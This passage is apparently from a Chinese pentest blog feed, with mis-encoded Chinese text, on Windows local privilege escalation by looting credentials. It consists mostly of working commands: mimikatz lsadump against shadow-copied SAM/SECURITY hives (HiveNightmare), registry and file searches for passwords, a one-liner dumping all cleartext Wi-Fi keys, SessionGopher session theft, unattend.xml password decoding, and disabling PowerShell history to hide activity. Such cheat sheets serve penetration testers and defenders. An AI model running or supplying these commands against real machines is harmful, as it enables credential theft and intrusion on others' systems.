<span class="nv">%WINDIR%</span>\debug\NetSetup.log
<span class="nv">%WINDIR%</span>\repair\sam
<span class="nv">%WINDIR%</span>\repair\system
<span class="nv">%WINDIR%</span>\repair\software<span class="o">,</span> <span class="nv">%WINDIR%</span>\repair\security
<span class="nv">%WINDIR%</span>\iis6.log
<span class="nv">%WINDIR%</span>\system32\config\AppEvent.Evt
<span class="nv">%WINDIR%</span>\system32\config\SecEvent.Evt
<span class="nv">%WINDIR%</span>\system32\config\default.sav
<span class="nv">%WINDIR%</span>\system32\config\security.sav
<span class="nv">%WINDIR%</span>\system32\config\software.sav
<span class="nv">%WINDIR%</span>\system32\config\system.sav
<span class="nv">%WINDIR%</span>\system32\CCM\logs\<span class="o">*</span>.log
<span class="nv">%USERPROFILE%</span>\ntuser.dat
<span class="nv">%USERPROFILE%</span>\LocalS<span class="o">~</span><span class="m">1</span>\Tempor<span class="o">~</span><span class="m">1</span>\Content.IE5\index.dat
<span class="nv">%WINDIR%</span>\System32\drivers\etc\hosts
<span class="kd">C</span>:\ProgramData\Configs\<span class="o">*</span>
<span class="kd">C</span>:\Program <span class="kd">Files</span>\Windows <span class="kd">PowerShell</span>\<span class="o">*</span>
<span class="nb">dir</span> <span class="kd">c</span>:<span class="o">*</span><span class="kd">vnc</span>.ini <span class="na">/s /b
</span><span class="nb">dir</span> <span class="kd">c</span>:<span class="o">*</span><span class="kd">ultravnc</span>.ini <span class="na">/s /b
</span></code></pre></div></div>

<h3 id="wifi-å¯†ç ">Wifi å¯†ç </h3>

<p>Find AP SSID</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profile</span>
</code></pre></div></div>

<p>Get Cleartext Pass</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profile</span> <span class="o">&lt;</span><span class="kd">SSID</span><span class="o">&gt;</span> <span class="kd">key</span><span class="o">=</span><span class="kd">clear</span>
</code></pre></div></div>

<p>Oneliner method to extract wifi passwords from all the access point.</p>

<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cls</span> <span class="o">&amp;</span> <span class="nb">echo</span>. <span class="o">&amp;</span> <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=4 delims=: "</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'netsh wlan show profiles </span><span class="se">^|</span><span class="s1"> find "Profile "'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="na">off</span> <span class="o">&gt;</span> <span class="kr">nul</span> <span class="o">&amp;</span> <span class="o">(</span><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profiles</span> <span class="kd">name</span><span class="o">=</span><span class="vm">%a</span> <span class="kd">key</span><span class="o">=</span><span class="kd">clear</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SSID Cipher Content"</span> <span class="o">|</span> <span class="nb">find</span> <span class="na">/v </span><span class="s2">"Number"</span> <span class="o">&amp;</span> <span class="nb">echo</span>.<span class="o">)</span> <span class="o">&amp;</span> @echo <span class="na">on</span>
</code></pre></div></div>
<p>æ³¨æ„ï¼Œè¯¥ä¸€å¥è¯ä»…å¯¹è‹±æ–‡ç³»ç»Ÿæœ‰ç”¨ï¼Œä¸­æ–‡ç³»ç»Ÿéœ€è¦ä¿®æ”¹åŒ¹é…å­—æ®µã€‚</p>

<h3 id="ä¾¿ç¬ºä¸­å­˜æ”¾çš„å¯†ç ">ä¾¿ç¬ºä¸­å­˜æ”¾çš„å¯†ç </h3>
<p>The sticky notes app stores itâ€™s content in a sqlite db located at C:\Users&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</p>

<h3 id="æœåŠ¡ä¸­å­˜æ”¾çš„å¯†ç ">æœåŠ¡ä¸­å­˜æ”¾çš„å¯†ç </h3>
<p>Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path<span class="se">\t</span>o<span class="se">\S</span>essionGopher.ps1<span class="p">;</span>
Invoke-SessionGopher <span class="nt">-AllDomain</span> <span class="nt">-o</span>
Invoke-SessionGopher <span class="nt">-AllDomain</span> <span class="nt">-u</span> domain.com<span class="se">\a</span>dm-arvanaghi <span class="nt">-p</span> s3cr3tP@ss
</code></pre></div></div>
<h3 id="key-manager-ä¸­å­˜æ”¾çš„å¯†ç ">Key Manager ä¸­å­˜æ”¾çš„å¯†ç </h3>
<p>This software will display its output in a GUI</p>

<p>ä¸‹é¢çš„å‘½ä»¤å°†æ‰“å¼€ windows å‡­æ®ç®¡ç†å™¨ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32 keymgr,KRShowKeyMgr
</code></pre></div></div>
<h3 id="powershell-å†å²è®°å½•ä¸­å­˜æ”¾çš„å¯†ç ">Powershell å†å²è®°å½•ä¸­å­˜æ”¾çš„å¯†ç </h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type</span> %userprofile%<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>wissky<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">type</span> <span class="nv">$env</span>:APPDATA<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadLine<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">cat</span> <span class="o">(</span>Get-PSReadlineOption<span class="o">)</span>.HistorySavePath
<span class="nb">cat</span> <span class="o">(</span>Get-PSReadlineOption<span class="o">)</span>.HistorySavePath | sls passw
</code></pre></div></div>

<p>å…³é—­ ps å†å²è®°å½•</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-PSReadlineOption <span class="nt">-HistorySaveStyle</span> SaveNothing
</code></pre></div></div>

<h3 id="powershell-transcript-æ–‡ä»¶">Powershell Transcript æ–‡ä»¶</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\&lt;</span>USERNAME&gt;<span class="se">\D</span>ocuments<span class="se">\P</span>owerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt
C:<span class="se">\T</span>ranscripts<span class="se">\&lt;</span>DATE&gt;<span class="se">\P</span>owerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt
</code></pre></div></div>

<h3 id="å¤‡ç”¨æ•°æ®æµadsä¸­çš„å¯†ç ">å¤‡ç”¨æ•°æ®æµï¼ˆADSï¼‰ä¸­çš„å¯†ç </h3>
<p>ADS æ˜¯æ·»åŠ åˆ°æ–°æŠ€æœ¯æ–‡ä»¶ç³»ç»Ÿï¼ˆä¹Ÿç§°ä¸º NT æ–‡ä»¶ç³»ç»Ÿ (NTFS)ï¼‰ä¸­çš„åŠŸèƒ½ï¼Œä»¥æé«˜ä¸ Macintosh åˆ†å±‚æ–‡ä»¶ç³»ç»Ÿ (HFS) çš„å¯æ¯”æ€§ã€‚</p>

<p>ä¾‹å¦‚åœ¨ notepad ä¸­ç¼–è¾‘ä½†æœªä¿å­˜åˆ°æ–‡ä»¶çš„æ•°æ®ã€‚</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Item</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w"> </span><span class="nt">-Stream</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Content</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w"> </span><span class="nt">-Stream</span><span class="w"> </span><span class="nx">Flag</span><span class="w">
</span></code></pre></div></div>

<h3 id="laps-settings">LAPS Settings</h3>
<p>Extract <code class="language-plaintext highlighter-rouge">HKLM\Software\Policies\Microsoft Services\AdmPwd</code> from Windows Registry.</p>

<ul>
  <li>LAPS Enabled: AdmPwdEnabled</li>
  <li>LAPS Admin Account Name: AdminAccountName</li>
  <li>LAPS Password Complexity: PasswordComplexity</li>
  <li>LAPS Password Length: PasswordLength</li>
  <li>LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled</li>
</ul>

<h1 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h1>
<ul>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords">PayloadsAllTheThings/Methodology and Resources/Windows - Privilege Escalation.md at master Â· swisskyrepo/PayloadsAllTheThings</a></li>
  <li><a href="https://www.freebuf.com/articles/web/281863.html">æ‰‹æŠŠæ‰‹æ•™ä½ Windowsææƒ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></li>
  <li><a href="https://github.com/alphaSeclab/windows-security/blob/master/Readme_full.md#f39e40e340f61ae168b67424baac5cc6">windows-security/Readme_full.md at master Â· alphaSeclab/windows-security</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="Pentest" /><category term="windows" /><category term="LPE" /><category term="Info gathering" /><summary type="html"><![CDATA[Windows æœ¬åœ°ææƒ åˆ©ç”¨å¯¼å‡ºæˆ–æŸ¥æ‰¾å¯†ç ææƒ ä¸»è¦æ€è·¯åœ¨äºä½¿ç”¨ mimikatz æˆ–è€…ä»é…ç½®æ–‡ä»¶ã€æ³¨å†Œè¡¨é¡¹ä¸­æ’æŸ¥å¯†ç ã€‚ SAM and SYSTEM files(win10 åŠä»¥ä¸‹) å®‰å…¨å¸æˆ·ç®¡ç†å™¨ (SAM)ï¼Œé€šå¸¸æ˜¯å®‰å…¨å¸æˆ·ç®¡ç†å™¨ï¼Œæ˜¯ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ã€‚ ç”¨æˆ·å¯†ç ä»¥å“ˆå¸Œæ ¼å¼å­˜å‚¨åœ¨æ³¨å†Œè¡¨é…ç½®å•å…ƒä¸­ï¼Œä½œä¸º LM å“ˆå¸Œæˆ– NTLM å“ˆå¸Œã€‚ è¯¥æ–‡ä»¶ä½äº %SystemRoot%/system32/config/SAM ä¸­ï¼Œå¹¶å®‰è£…åœ¨ HKLM/SAM ä¸Šã€‚ # Usually %SYSTEMROOT% = C:\Windows %SYSTEMROOT%\repair\SAM %SYSTEMROOT%\System32\config\RegBack\SAM %SYSTEMROOT%\System32\config\SAM %SYSTEMROOT%\repair\system %SYSTEMROOT%\System32\config\SYSTEM %SYSTEMROOT%\System32\config\RegBack\system ç›´æ¥ä½¿ç”¨ mimikatz æå–å³å¯ï¼Œæ— éœ€ä½¿ç”¨ pwddump HiveNightmare(Windows 10 and 11) ä¸å½±å“ Serverã€‚ CVE-2021â€“36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user ä½¿ç”¨ icacls å‘½ä»¤æ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨ C:\Windows\System32&gt; icacls config\SAM config\SAM BUILTIN\Administrators:(I)(F) NT AUTHORITY\SYSTEM:(I)(F) BUILTIN\Users:(I)(RX) &lt;-- this is wrong - regular users should not have read access! Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it. mimikatz&gt; token::whoami /full # List shadow copies available mimikatz&gt; misc::shadowcopies # Extract account from SAM databases mimikatz&gt; lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM # Extract secrets from SECURITY mimikatz&gt; lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY ã€æ¼æ´å¤ç°ã€‘CVE-2021-36934 Windows ææƒæ¼æ´å¤ç° - TeamsSix æœç´¢æ–‡ä»¶å†…å®¹ä¸­çš„ password åœ¨ .xml, .ini, .txt .config ç­‰æ–‡ä»¶ä¸­æœç´¢ Password cd C:\ &amp; findstr /SI /M "password" *.xml *.ini *.txt findstr /si password *.xml *.ini *.txt *.config 2&gt;nul &gt;&gt; results.txt findstr /spin "password" *.* åœ¨è¿œç¨‹åœ°å€ä¾‹å¦‚ SMB Shares æˆ– SharePoint æœç´¢ Search passwords in SharePoint: nheiniger/SnaffPoint (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6) # First, retrieve a token ## Method 1: using SnaffPoint binary $token = (.\GetBearerToken.exe https://your.sharepoint.com) ## Method 2: using AADInternals Install-Module AADInternals -Scope CurrentUser Import-Module AADInternals $token = (Get-AADIntAccessToken -ClientId "9bc3ab49-b65d-410a-85ad-de819febfddc" -Tenant "your.onmicrosoft.com" -Resource "https://your.sharepoint.com") # Second, search on Sharepoint ## Method 1: using search strings in ./presets dir .\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token ## Method 2: using search string in command line ### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference .\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token -l -q "filename:.config" Search passwords in SMB Shares: SnaffCon/Snaffler æœç´¢å’Œ password ç›¸å…³çš„æ–‡ä»¶å dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* where /R C:\ user.txt where /R C:\ *.ini æœç´¢å’Œ password ç›¸å…³çš„æ³¨å†Œè¡¨ REG QUERY HKLM /F "password" /t REG_SZ /S /K REG QUERY HKCU /F "password" /t REG_SZ /S /K reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2&gt;nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s åœ¨ unattend.xml ä¸­æœç´¢å¯†ç  è‡ªåŠ¨å®‰è£…å…è®¸ç¨‹åºåœ¨ä¸éœ€è¦ç®¡ç†å‘˜å…³æ³¨ä¸‹è‡ªåŠ¨å®‰è£…ã€‚è¿™ç§è§£å†³æ–¹æ¡ˆç”¨äºåœ¨æ‹¥æœ‰è¾ƒå¤šé›‡å‘˜å’Œæ—¶é—´ç´§ç¼ºçš„è¾ƒå¤§å‹ç»„ç»‡ä¸­éƒ¨ç½²ç¨‹åºã€‚å¦‚æœç®¡ç†å‘˜æ²¡æœ‰è¿›è¡Œæ¸…ç†çš„è¯ï¼Œé‚£ä¹ˆä¼šæœ‰ä¸€ä¸ªåä¸ºUnattendçš„XMLæ–‡ä»¶æ®‹å­˜åœ¨ç³»ç»Ÿä¸Šã€‚è¿™ä¸ªXMLæ–‡ä»¶åŒ…å«æ‰€æœ‰åœ¨å®‰è£…ç¨‹åºè¿‡ç¨‹ä¸­çš„é…ç½®ï¼ŒåŒ…æ‹¬ä¸€äº›æœ¬åœ°ç”¨æˆ·çš„é…ç½®ï¼Œä»¥åŠç®¡ç†å‘˜è´¦æˆ·ã€‚ Location of the unattend.xml files. C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Unattend\Unattend.xml C:\Windows\system32\sysprep.inf C:\Windows\system32\sysprep\sysprep.xml Display the content of these files with dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul. Example content &lt;component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64"&gt; &lt;AutoLogon&gt; &lt;Password&gt;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==&lt;/Password&gt; &lt;Enabled&gt;true&lt;/Enabled&gt; &lt;Username&gt;Administrateur&lt;/Username&gt; &lt;/AutoLogon&gt; &lt;UserAccounts&gt; &lt;LocalAccounts&gt; &lt;LocalAccount wcm:action="add"&gt; &lt;Password&gt;*SENSITIVE*DATA*DELETED*&lt;/Password&gt; &lt;Group&gt;administrators;users&lt;/Group&gt; &lt;Name&gt;Administrateur&lt;/Name&gt; &lt;/LocalAccount&gt; &lt;/LocalAccounts&gt; &lt;/UserAccounts&gt; Unattend credentials are stored in base64 and can be decoded manually with base64. $ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=" | base64 -d SecretSecurePassword1234* The Metasploit module post/windows/gather/enum_unattend looks for these files. Unattended Installsææƒ - zpchcbd - åšå®¢å›­ IIS Web config ä¸­çš„å¯†ç  Get-Childitem â€“Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config C:\inetpub\wwwroot\web.config å…¶ä»–å¯èƒ½å­˜åœ¨å‡­è¯çš„æ–‡ä»¶ %SYSTEMDRIVE%\pagefile.sys %WINDIR%\debug\NetSetup.log %WINDIR%\repair\sam %WINDIR%\repair\system %WINDIR%\repair\software, %WINDIR%\repair\security %WINDIR%\iis6.log %WINDIR%\system32\config\AppEvent.Evt %WINDIR%\system32\config\SecEvent.Evt %WINDIR%\system32\config\default.sav %WINDIR%\system32\config\security.sav %WINDIR%\system32\config\software.sav %WINDIR%\system32\config\system.sav %WINDIR%\system32\CCM\logs\*.log %USERPROFILE%\ntuser.dat %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat %WINDIR%\System32\drivers\etc\hosts C:\ProgramData\Configs\* C:\Program Files\Windows PowerShell\* dir c:*vnc.ini /s /b dir c:*ultravnc.ini /s /b Wifi å¯†ç  Find AP SSID netsh wlan show profile Get Cleartext Pass netsh wlan show profile &lt;SSID&gt; key=clear Oneliner method to extract wifi passwords from all the access point. cls &amp; echo. &amp; for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off &gt; nul &amp; (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" &amp; echo.) &amp; @echo on æ³¨æ„ï¼Œè¯¥ä¸€å¥è¯ä»…å¯¹è‹±æ–‡ç³»ç»Ÿæœ‰ç”¨ï¼Œä¸­æ–‡ç³»ç»Ÿéœ€è¦ä¿®æ”¹åŒ¹é…å­—æ®µã€‚ ä¾¿ç¬ºä¸­å­˜æ”¾çš„å¯†ç  The sticky notes app stores itâ€™s content in a sqlite db located at C:\Users&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite æœåŠ¡ä¸­å­˜æ”¾çš„å¯†ç  Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1 Import-Module path\to\SessionGopher.ps1; Invoke-SessionGopher -AllDomain -o Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss Key Manager ä¸­å­˜æ”¾çš„å¯†ç  This software will display its output in a GUI ä¸‹é¢çš„å‘½ä»¤å°†æ‰“å¼€ windows å‡­æ®ç®¡ç†å™¨ã€‚ rundll32 keymgr,KRShowKeyMgr Powershell å†å²è®°å½•ä¸­å­˜æ”¾çš„å¯†ç  type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt cat (Get-PSReadlineOption).HistorySavePath cat (Get-PSReadlineOption).HistorySavePath | sls passw å…³é—­ ps å†å²è®°å½• Set-PSReadlineOption -HistorySaveStyle SaveNothing Powershell Transcript æ–‡ä»¶ C:\Users\&lt;USERNAME&gt;\Documents\PowerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt C:\Transcripts\&lt;DATE&gt;\PowerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt å¤‡ç”¨æ•°æ®æµï¼ˆADSï¼‰ä¸­çš„å¯†ç  ADS æ˜¯æ·»åŠ åˆ°æ–°æŠ€æœ¯æ–‡ä»¶ç³»ç»Ÿï¼ˆä¹Ÿç§°ä¸º NT æ–‡ä»¶ç³»ç»Ÿ (NTFS)ï¼‰ä¸­çš„åŠŸèƒ½ï¼Œä»¥æé«˜ä¸ Macintosh åˆ†å±‚æ–‡ä»¶ç³»ç»Ÿ (HFS) çš„å¯æ¯”æ€§ã€‚ ä¾‹å¦‚åœ¨ notepad ä¸­ç¼–è¾‘ä½†æœªä¿å­˜åˆ°æ–‡ä»¶çš„æ•°æ®ã€‚ PS &gt; Get-Item -path flag.txt -Stream * PS &gt; Get-Content -path flag.txt -Stream Flag LAPS Settings Extract HKLM\Software\Policies\Microsoft Services\AdmPwd from Windows Registry. LAPS Enabled: AdmPwdEnabled LAPS Admin Account Name: AdminAccountName LAPS Password Complexity: PasswordComplexity LAPS Password Length: PasswordLength LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled å‚è€ƒèµ„æ–™ PayloadsAllTheThings/Methodology and Resources/Windows - Privilege Escalation.md at master Â· swisskyrepo/PayloadsAllTheThings æ‰‹æŠŠæ‰‹æ•™ä½ Windowsææƒ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· windows-security/Readme_full.md at master Â· alphaSeclab/windows-security]]></summary></entry><entry><title type="html">Windows ææƒçŸ¥è¯†ç‚¹</title><link href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E7%82%B9.html" rel="alternate" type="text/html" title="Windows ææƒçŸ¥è¯†ç‚¹" /><published>2023-11-20T13:34:21+08:00</published><updated>2023-11-20T13:34:21+08:00</updated><id>/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E7%82%B9</id><content type="html" xml:base="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E7%82%B9.html"><![CDATA[<h1 id="windows-æœ¬åœ°ææƒ">Windows æœ¬åœ°ææƒ</h1>
<h2 id="åˆ©ç”¨å¯¼å‡ºæˆ–æŸ¥æ‰¾å¯†ç ææƒ">åˆ©ç”¨å¯¼å‡ºæˆ–æŸ¥æ‰¾å¯†ç ææƒ</h2>
<p>ä¸»è¦æ€è·¯åœ¨äºä½¿ç”¨ mimikatz æˆ–è€…ä»é…ç½®æ–‡ä»¶ã€æ³¨å†Œè¡¨é¡¹ä¸­æ’æŸ¥å¯†ç ã€‚</p>

<h3 id="sam-and-system-fileswin10-åŠä»¥ä¸‹">SAM and SYSTEM files(win10 åŠä»¥ä¸‹)</h3>
<p>å®‰å…¨å¸æˆ·ç®¡ç†å™¨ (SAM)ï¼Œé€šå¸¸æ˜¯å®‰å…¨å¸æˆ·ç®¡ç†å™¨ï¼Œæ˜¯ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ã€‚<br />
ç”¨æˆ·å¯†ç ä»¥å“ˆå¸Œæ ¼å¼å­˜å‚¨åœ¨æ³¨å†Œè¡¨é…ç½®å•å…ƒä¸­ï¼Œä½œä¸º LM å“ˆå¸Œæˆ– NTLM å“ˆå¸Œã€‚<br />
è¯¥æ–‡ä»¶ä½äº %SystemRoot%/system32/config/SAM ä¸­ï¼Œå¹¶å®‰è£…åœ¨ HKLM/SAM ä¸Šã€‚</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Usually %SYSTEMROOT% = C:\Windows</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\repair\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\RegBack\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\repair\system</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\SYSTEM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\RegBack\system</span><span class="w">
</span></code></pre></div></div>

<p><strong>ç›´æ¥ä½¿ç”¨ mimikatz æå–å³å¯ï¼Œæ— éœ€ä½¿ç”¨ pwddump</strong></p>

<h3 id="hivenightmarewindows-10-and-11">HiveNightmare(Windows 10 and 11)</h3>
<p>ä¸å½±å“ Serverã€‚</p>

<blockquote>
  <p>CVE-2021â€“36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user</p>
</blockquote>

<p>ä½¿ç”¨ <code class="language-plaintext highlighter-rouge">icacls</code> å‘½ä»¤æ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\System32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">icacls</span><span class="w"> </span><span class="nx">config\SAM</span><span class="w">
</span><span class="n">config\SAM</span><span class="w"> </span><span class="nx">BUILTIN\Administrators:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
           </span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\SYSTEM:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
           </span><span class="n">BUILTIN\Users:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span><span class="w">    </span><span class="err">&lt;</span><span class="o">--</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">wrong</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">regular</span><span class="w"> </span><span class="nx">users</span><span class="w"> </span><span class="nx">should</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">read</span><span class="w"> </span><span class="nx">access</span><span class="o">!</span><span class="w">
</span></code></pre></div></div>

<p>Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">token::whoami</span><span class="w"> </span><span class="nx">/full</span><span class="w">

</span><span class="c"># List shadow copies available</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">misc::shadowcopies</span><span class="w">

</span><span class="c"># Extract account from SAM databases</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">lsadump::sam</span><span class="w"> </span><span class="nx">/system:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</span><span class="w"> </span><span class="nx">/sam:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM</span><span class="w">

</span><span class="c"># Extract secrets from SECURITY</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">lsadump::secrets</span><span class="w"> </span><span class="nx">/system:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</span><span class="w"> </span><span class="nx">/security:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li><a href="https://teamssix.com/210725-074847.html#!">ã€æ¼æ´å¤ç°ã€‘CVE-2021-36934 Windows ææƒæ¼æ´å¤ç° - TeamsSix</a></li>
</ul>

<h3 id="æœç´¢æ–‡ä»¶å†…å®¹ä¸­çš„-password">æœç´¢æ–‡ä»¶å†…å®¹ä¸­çš„ password</h3>
